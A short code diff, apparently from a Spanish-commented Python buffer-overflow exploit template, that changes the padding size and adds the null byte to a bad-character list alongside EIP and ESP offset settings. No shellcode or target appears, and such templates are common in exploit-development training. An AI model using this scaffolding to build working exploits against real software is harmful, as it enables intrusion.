@@ -20,10 +20,10 @@ offsetEIP = 0
 offsetESP = offsetEIP + 4
 
 # tamaño máximo del relleno del padding final
-buffer = 2000
+buffer = 3000
 
 # PASO IV
-badchars = [] # badchars = [0x00, 0x0a, 0x0d]
+badchars = [0x00] # badchars = [0x00, 0x0a, 0x0d]
 badcharsSequence = bytes(c for c in range(256) if c not in badchars)
 
 # PASO V
